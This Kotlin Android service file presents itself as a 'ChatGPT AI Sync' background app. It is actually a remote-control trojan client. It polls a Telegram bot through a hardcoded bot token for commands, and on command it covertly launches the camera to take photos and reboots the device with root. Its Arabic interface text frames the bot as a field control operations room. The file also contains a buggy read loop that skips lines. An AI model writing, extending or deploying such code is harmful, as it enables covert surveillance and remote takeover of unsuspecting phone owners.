package com.cognitive.ai.syncagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class BackgroundControlService : Service() {

    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
    private var lastUpdateId = 0L
    private var isRunning = true

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceNotification()
        startTelegramPolling()
        return START_STICKY
    }

    private fun startForegroundServiceNotification() {
        val channelId = "sync_channel_v81"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "المزامنة الخلفية نشطة",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
                .setContentTitle("ChatGPT AI Sync")
                .setContentText("النظام يعمل بكفاءة في الخلفية")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("ChatGPT AI Sync")
                .setContentText("النظام يعمل بكفاءة في الخلفية")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()
        }

        startForeground(1001, notification)
    }

    private fun startTelegramPolling() {
        thread(start = true) {
            while (isRunning) {
                try {
                    val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=5"
                    val url = URL(urlString)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.connectTimeout = 6000
                    connection.readTimeout = 6000

                    if (connection.responseCode == 200) {
                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
                        val response = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = reader.readLine() } != null) {
                            response.append(line)
                        }
                        reader.close()

                        val jsonResponse = JSONObject(response.toString())
                        if (jsonResponse.getBoolean("ok")) {
                            val results = jsonResponse.getJSONArray("result")
                            for (i in 0 until results.length()) {
                                val update = results.getJSONObject(i)
                                lastUpdateId = update.getLong("update_id")

                                // دعم الأوامر النصية وضغطات الأزرار (callback_query)
                                var chatId = ""
                                var text = ""

                                if (update.has("message")) {
                                    val message = update.getJSONObject("message")
                                    if (message.has("text")) {
                                        chatId = message.getJSONObject("chat").getLong("id").toString()
                                        text = message.getString("text")
                                        handleCommand(chatId, text)
                                    }
                                } else if (update.has("callback_query")) {
                                    val callbackQuery = update.getJSONObject("callback_query")
                                    chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                    text = callbackQuery.getString("data")
                                    handleCommand(chatId, text)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    // تجاهل أخطاء الشبكة المؤقتة
                }
                Thread.sleep(7000)
            }
        }
    }

    private fun handleCommand(chatId: String, text: String) {
        when {
            text == "/start" || text == "لوحة التحكم" -> {
                val welcomeMsg = "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب من الأزرار أدناه:"
                sendTelegramMessageWithKeyboard(chatId, welcomeMsg)
            }
            text == "/photo" || text.contains("صورة") -> {
                try {
                    val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("chat_id", chatId)
                    }
                    applicationContext.startActivity(intent)
                    sendTelegramMessage(chatId, "📸 جاري تشغيل الكاميرا والتقاط الصورة الطبيعية الآن...")
                } catch (e: Exception) {
                    sendTelegramMessage(chatId, "⚠️ فشل تشغيل واجهة الكاميرا: ${e.message}")
                }
            }
            text == "/reboot" -> {
                sendTelegramMessage(chatId, "🔌 جاري إعادة تشغيل النظام...")
                try {
                    val runtime = Runtime.getRuntime()
                    runtime.exec(arrayOf("su", "-c", "reboot"))
                } catch (e: Exception) {
                    sendTelegramMessage(chatId, "⚠️ صلاحيات الجذع (Root) غير متوفرة لإعادة التشغيل المباشر.")
                }
            }
            else -> {
                sendTelegramMessage(chatId, "❓ أمر غير معروف. استخدم /start لعرض لوحة التحكم.")
            }
        }
    }

    private fun sendTelegramMessage(chatId: String, text: String) {
        thread {
            try {
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${java.net.URLEncoder.encode(text, "UTF-8")}"
                val connection = URL(urlString).openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.inputStream.close()
            } catch (e: Exception) {}
        }
    }

    private fun sendTelegramMessageWithKeyboard(chatId: String, text: String) {
        thread {
            try {
                val keyboardJson = """
                    {
                      "inline_keyboard": [
                        [
                          {"text": "📸 التقاط صورة", "callback_data": "/photo"},
                          {"text": "🔌 إعادة تشغيل", "callback_data": "/reboot"}
                        ]
                      ]
                    }
                """.trimIndent()

                val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                    put("reply_markup", JSONObject(keyboardJson))
                }

                val os = connection.outputStream
                os.write(payload.toString().toByteArray(Charsets.UTF_8))
                os.flush()
                os.close()

                connection.inputStream.close()
            } catch (e: Exception) {}
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
